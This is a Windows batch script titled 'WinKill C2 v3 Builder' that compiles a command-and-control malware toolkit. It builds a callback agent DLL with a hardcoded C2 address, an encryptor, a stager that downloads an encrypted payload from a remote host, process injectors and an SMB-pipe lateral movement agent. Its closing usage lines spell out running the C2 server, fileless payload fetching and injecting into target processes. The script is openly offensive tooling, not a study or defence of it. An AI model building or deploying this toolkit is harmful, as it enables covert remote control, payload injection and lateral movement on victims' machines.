@echo off
cd /d "%~dp0"
set IP=192.168.102.167
set PORT=4444
if not "%1"=="" set IP=%1
if not "%2"=="" set PORT=%2

echo import socket,struct > _tmp.py
echo print(hex(struct.unpack('^<I',socket.inet_aton('%IP%'))[0])) >> _tmp.py
for /f %%i in ('python _tmp.py') do set IPHEX=%%i
del _tmp.py

echo ============================================
echo   WinKill C2 v3 Builder
echo   C2: %IP%:%PORT%  (hex: %IPHEX%)
echo ============================================

echo [1/7] agent.dll...
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.dll agent_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo [2/7] .\encrypt.exe...
gcc -O2 -s -m64 -fno-ident -o .\encrypt.exe encrypt_source.c || goto :err

echo [3/7] agent.dll.enc + payload.bin...
.\encrypt.exe agent.dll || goto :err
copy /Y agent.dll.enc payload.bin >nul 2>&1

echo [4/7] stager.exe...
gcc -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp || goto :err

echo [5/7] injector.exe...
gcc -O2 -s -m64 -fno-ident -o injector.exe injector_source.c || goto :err

echo [6/7] injector_enc.exe...
gcc -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c || goto :err

echo [7/7] agent.exe...
gcc -O2 -s -m64 -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.exe agent_exe_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo [8/8] agent_smb.exe (SMB pipe lateral movement)...
gcc -O2 -s -m64 -fno-ident -o agent_smb.exe agent_smb_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo.
echo ============================================
echo   Build Complete!
echo ============================================
echo.
echo   Usage: build.bat [IP] [PORT]
echo.
echo   Server:   python c2_server.py 0.0.0.0 %PORT%
echo.
echo   Fileless: stager.exe http://YOU:8080/payload.bin [target_exe]
echo   Inject:   injector_enc.exe agent.dll.enc [target_exe]
echo   Standalone: agent.exe
echo   SMB relay: agent_smb.exe \\C1_HOST\pipe\winagent
echo.
goto :end

:err
echo BUILD FAILED!
:end
